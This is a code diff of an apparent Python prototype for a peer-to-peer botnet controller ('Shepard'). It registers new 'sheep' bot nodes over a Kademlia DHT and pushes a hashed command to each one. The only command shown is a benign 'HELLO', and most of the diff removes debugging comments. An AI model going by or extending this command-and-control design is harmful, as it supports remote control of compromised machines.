@@ -37,9 +37,7 @@ class Shepard():
         self._sheeps = {}
         self._count = 0
         #TODO: add looping call to check for new nodes
-        #self.sheeploop = loop.call_soon_threadsafe(checknewsheep())
-        #self.sheeploop = loop.call_later(8, functools.partial(self.checknewsheep())) 
-        #self.checkin = loop.call_soon_threadsafe( self.checknewsheep())
+        #self.sheeploop = loop.call_later(8, functools.partial(self.checknewsheep())) )
     """
     Checks if new sheep are present otherwise returns false
     """
@@ -55,18 +53,14 @@ class Shepard():
                     print("\nSetting Key:\nSheep NodeID: {}\nSheep CMD entry Key: {}\n".format(val, newval))
                     ## Set the NODEID 'val' of nearest neightbor to newval 'cmdkey of the bot'
                     result = await self._kserver.set(self._sheeps[val], str(val))
-                    #RESOLVED: Commander hangs after set, node goes into loop saying that is has acked the network, and recieved a command, but not command is ever run.
-                    # Update: I dont think the task ever returns from await state
-                    # Update: added return statements 
                     print("Added a new sheep")
                     pp.pprint(leader._sheeps)
                     await self.sheepGreeter()
                     return result
-                #print("No new sheep")
                 return False    
-        #pdb.set_trace()
         asyncio.sleep(5)
-        result = await self._kserver.get(self._key) #Should pull most recent entry added to network key ie command key of a nodeID
+        #TODO: Implement Queue here so we can get multiple new nodes
+        result = await self._kserver.get(self._key) #Should pull most recent entry added to network key ie command key of a nodeID 
         return await addsheep(result)
         
     """
@@ -74,11 +68,9 @@ class Shepard():
     """
     async def sheepGreeter(self):
         cmd="HELLO"
-        #print()
         #Iterate through sheeps list and send command to all sheep
         while await self.checknewsheep(): #Loop while this is true
             for key, val in self._sheeps.items():
-                #print("\nKEY: {} VAL: {}\nPOSSIBLE ITEMS {}\n\n".format(key,val,self.sheeps.items()))
                 print("Starting HELLO for bot ID {}\nCMD_VALUE:{}".format(key,val))
                 botcmdtorun = get_hash(cmd) #"HELLO" is currently static command -> sayHello.py
                 await self._kserver.set(val,botcmdtorun)
@@ -111,24 +103,13 @@ loop.run_until_complete(kserver.listen(myport))
 loop.run_until_complete(kserver.bootstrap([(bootstrap_ip, bootstrap_port)]))
 
 leader = Shepard(kserver, NETKEY)
-#from botnet_dev import bootstrapDone #setup, callhome
-
-
 
 try:
-    #pdb.set_trace()
-    #loop.run_until_complete(setup(kserver)) #This returns bool, or nonetype
-    #fi 
     loop_counter=0   
     while True:
         loop_counter+=1
-        #print("Started a new loop numer:\n{}".format(loop_counter))
         loop.run_until_complete(leader.checknewsheep())
         pp.pprint(vars(leader))
-        #pp.pprint(leader._sheeps)
-        import time
-        #time.sleep(5)
-        #print(leader._sheeps)
         if loop_counter > 10000: #kill before infinity happens 10000
             print("to many loop")
             break
